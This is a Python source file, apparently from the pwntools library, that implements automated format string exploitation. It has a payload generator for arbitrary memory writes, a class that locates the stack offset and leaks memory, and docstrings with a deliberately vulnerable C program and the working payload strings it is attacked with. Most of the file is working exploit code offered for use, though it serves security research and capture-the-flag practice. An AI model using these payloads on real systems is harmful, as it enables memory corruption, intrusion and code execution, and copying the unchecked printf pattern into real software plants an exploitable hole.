r"""
Provide some tools to exploit format string bug

Examples:

    >>> program = tempfile.mktemp()
    >>> source  = program + ".c"
    >>> write(source, '''
    ... #include <stdio.h>
    ... #include <stdlib.h>
    ... #include <unistd.h>
    ... #include <sys/mman.h>
    ... #define MEMORY_ADDRESS ((void*)0x11111000)
    ... #define MEMORY_SIZE 1024
    ... #define TARGET ((int *) 0x11111110)
    ... int main(int argc, char const *argv[])
    ... {
    ...        char buff[1024];
    ...        void *ptr = NULL;
    ...        int *my_var = TARGET;
    ...        ptr = mmap(MEMORY_ADDRESS, MEMORY_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
    ...        if(ptr != MEMORY_ADDRESS)
    ...        {
    ...                perror("mmap");
    ...                return EXIT_FAILURE;
    ...        }
    ...        *my_var = 0x41414141;
    ...        write(1, &my_var, sizeof(int *));
    ...        scanf("%s", buff);
    ...        dprintf(2, buff);
    ...        write(1, my_var, sizeof(int));
    ...        return 0;
    ... }''')
    >>> cmdline = ["gcc", source, "-Wno-format-security", "-m32", "-o", program]
    >>> process(cmdline).wait_for_close()
    >>> def exec_fmt(payload):
    ...     p = process(program)
    ...     p.sendline(payload)
    ...     return p.recvall()
    ...
    >>> autofmt = FmtStr(exec_fmt)
    >>> offset = autofmt.offset
    >>> p = process(program, stderr=subprocess.PIPE)
    >>> addr = unpack(p.recv(4))
    >>> payload = fmtstr_payload(offset, {addr: 0x1337babe})
    >>> p.sendline(payload)
    >>> print hex(unpack(p.recv(4)))
    0x1337babe

Example - Payload generation
^^^^^^^^^^^^^^^^^^^^^^^^^^^^

.. code-block:: python

    # we want to do 3 writes
    writes = {0x08041337:   0xbfffffff,
              0x08041337+4: 0x1337babe,
              0x08041337+8: 0xdeadbeef}

    # the printf() call already writes some bytes
    # for example :
    # strcat(dest, "blabla :", 256);
    # strcat(dest, your_input, 256);
    # printf(dest);
    # Here, numbwritten parameter must be 8
    payload = fmtstr_payload(5, writes, numbwritten=8)

Example - Automated exploitation
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

.. code-block:: python

	# Assume a process that reads a string
	# and gives this string as the first argument
	# of a printf() call
	# It do this indefinitely
	p = process('./vulnerable')

	# Function called in order to send a payload
	def send_payload(payload):
		log.info("payload = %s" % repr(payload))
		p.sendline(payload)
		return p.recv()

	# Create a FmtStr object and give to him the function
	format_string = FmtStr(execute_fmt=send_payload)
	format_string.write(0x0, 0x1337babe) # write 0x1337babe at 0x0
	format_string.write(0x1337babe, 0x0) # write 0x0 at 0x1337babe
	format_string.execute_writes()

"""
import logging
import re

from pwnlib.log import getLogger
from pwnlib.memleak import MemLeak
from pwnlib.util.cyclic import *
from pwnlib.util.fiddling import randoms
from pwnlib.util.packing import *

log = getLogger(__name__)

def fmtstr_payload(offset, writes, numbwritten=0, write_size='byte'):
    r"""fmtstr_payload(offset, writes, numbwritten=0, write_size='byte') -> str

    Makes payload with given parameter.
    It can generate payload for 32 or 64 bits architectures.
    The size of the addr is taken from ``context.bits``

    Arguments:
        offset(int): the first formatter's offset you control
        writes(dict): dict with addr, value ``{addr: value, addr2: value2}``
        numbwritten(int): number of byte already written by the printf function
        write_size(str): must be ``byte``, ``short`` or ``int``. Tells if you want to write byte by byte, short by short or int by int (hhn, hn or n)
    Returns:
        The payload in order to do needed writes

    Examples:
        >>> context.clear(arch = 'amd64')
        >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int'))
        '\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00%322419374c%1$n%3972547906c%2$n'
        >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short'))
        '\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00%47774c%1$hn%22649c%2$hn%60617c%3$hn%4$hn'
        >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte'))
        '\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00%126c%1$hhn%252c%2$hhn%125c%3$hhn%220c%4$hhn%237c%5$hhn%6$hhn%7$hhn%8$hhn'
        >>> context.clear(arch = 'i386')
        >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int'))
        '\x00\x00\x00\x00%322419386c%1$n'
        >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short'))
        '\x00\x00\x00\x00\x02\x00\x00\x00%47798c%1$hn%22649c%2$hn'
        >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte'))
        '\x00\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00%174c%1$hhn%252c%2$hhn%125c%3$hhn%220c%4$hhn'

    """

    # 'byte': (number, step, mask, format, decalage)
    config = {
        32 : {
            'byte': (4, 1, 0xFF, 'hh', 8),
            'short': (2, 2, 0xFFFF, 'h', 16),
            'int': (1, 4, 0xFFFFFFFF, '', 32)},
        64 : {
            'byte': (8, 1, 0xFF, 'hh', 8),
            'short': (4, 2, 0xFFFF, 'h', 16),
            'int': (2, 4, 0xFFFFFFFF, '', 32)
        }
    }

    if write_size not in ['byte', 'short', 'int']:
        log.error("write_size must be 'byte', 'short' or 'int'")

    number, step, mask, formatz, decalage = config[context.bits][write_size]

    # add wheres
    payload = ""
    for where, what in writes.items():
        for i in range(0, number*step, step):
            payload += pack(where+i)

    numbwritten += len(payload)
    fmtCount = 0
    for where, what in writes.items():
        for i in range(0, number):
            current = what & mask
            if numbwritten & mask <= current:
                to_add = current - (numbwritten & mask)
            else:
                to_add = (current | (mask+1)) - (numbwritten & mask)

            if to_add != 0:
                payload += "%{}c".format(to_add)
            payload += "%{}${}n".format(offset + fmtCount, formatz)

            numbwritten += to_add
            what >>= decalage
            fmtCount += 1

    return payload

class FmtStr(object):
    """
    Provides an automated format string exploitation.

    It takes a function which is called every time the automated
    process want to communicate with the vulnerable process. this
    function takes a parameter with the payload that you have to
    send to the vulnerable process and must return the process
    returns.

    If the `offset` parameter is not given, then try to find the right
    offset by leaking stack data.

    Arguments:
            execute_fmt(function): function to call for communicate with the vulnerable process
            offset(int): the first formatter's offset you control
            padlen(int): size of the pad you want to add before the payload
            numbwritten(int): number of already written bytes

    """

    def __init__(self, execute_fmt, offset = None, padlen = 0, numbwritten = 0):
        """
        Instantiates an object which try to automating exploit the vulnerable process

        Arguments:
            execute_fmt(function): function to call for communicate with the vulnerable process
            offset(int): the first formatter's offset you control
            padlen(int): size of the pad you want to add before the payload
            numbwritten(int): number of already written bytes
        """
        self.execute_fmt = execute_fmt
        self.offset = offset
        self.padlen = padlen
        self.numbwritten = numbwritten


        if self.offset == None:
            self.offset, self.padlen = self.find_offset()
            log.info("Found format string offset: %d", self.offset)

        self.writes = {}
        self.leaker = MemLeak(self._leaker)

    def leak_stack(self, offset, prefix=""):
        leak = self.execute_fmt(prefix+"START%{}$pEND".format(offset))
        try:
            leak = re.findall(r"START(.*)END", leak, re.MULTILINE | re.DOTALL)[0]
            leak = int(leak, 16)
        except ValueError:
            leak = 0
        return leak

    def find_offset(self):
        marker = cyclic(20)
        for off in range(1,1000):
            leak = self.leak_stack(off, marker)
            leak = pack(leak)

            pad = cyclic_find(leak)
            if pad >= 0 and pad < 20:
                return off, pad
        else:
            log.error("Could not find offset to format string on stack")
            return None, None

    def _leaker(self, addr):
        # Hack: elfheaders often start at offset 0 in a page,
        # but we often can't leak addresses containing null bytes,
        # and the page below elfheaders is often not mapped.
        # Thus the solution to this problem is to check if the next 3 bytes are
        # "ELF" and if so we lie and leak "\x7f"
        # unless it is leaked otherwise.
        if addr & 0xfff == 0 and self.leaker._leak(addr+1, 3, False) == "ELF":
            return "\x7f"

        fmtstr = randoms(self.padlen) + pack(addr) + "START%%%d$sEND" % self.offset

        leak = self.execute_fmt(fmtstr)
        leak = re.findall(r"START(.*)END", leak, re.MULTILINE | re.DOTALL)[0]

        leak += "\x00"

        return leak

    def execute_writes(self):
        """execute_writes() -> None

        Makes payload and send it to the vulnerable process

        Returns:
            None

        """
        fmtstr = randoms(self.padlen)
        fmtstr += fmtstr_payload(self.offset, self.writes, numbwritten=self.padlen, write_size='byte')
        self.execute_fmt(fmtstr)
        self.writes = {}

    def write(self, addr, data):
        r"""write(addr, data) -> None

        In order to tell : I want to write ``data`` at ``addr``.

        Arguments:
            addr(int): the address where you want to write
            data(int): the data that you want to write ``addr``

        Returns:
            None

        Examples:

            >>> def send_fmt_payload(payload):
            ...     print repr(payload)
            ...
            >>> f = FmtStr(send_fmt_payload, offset=5)
            >>> f.write(0x08040506, 0x1337babe)
            >>> f.execute_writes()
            '\x06\x05\x04\x08\x07\x05\x04\x08\x08\x05\x04\x08\t\x05\x04\x08%174c%5$hhn%252c%6$hhn%125c%7$hhn%220c%8$hhn'

        """
        self.writes[addr] = data
